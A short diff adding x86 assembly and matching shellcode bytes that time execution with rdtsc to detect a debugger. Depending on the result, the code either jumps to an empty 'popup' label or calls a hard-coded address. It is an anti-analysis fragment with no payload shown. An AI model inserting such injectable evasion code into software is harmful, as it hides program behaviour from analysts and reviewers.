@@ -1,0 +1,14 @@
+rdtsc
+xor ecx,ecx
+add ecx, eax
+rdtsc
+sub eax, ecx
+cmp eax, 0xFFF
+jb popup
+rdtsc
+push eax
+mov    eax,0x4094e4
+call   eax
+popup:
+//shellcode
+\x0F\x31\x31\xC9\x01\xC1\x0F\x31\x29\xC8\x3D\xFF\x0F\x00\x00\x72\x0A\x0F\x31\x50\xB8\xE4\x94\x40\x00\xFF\xD0
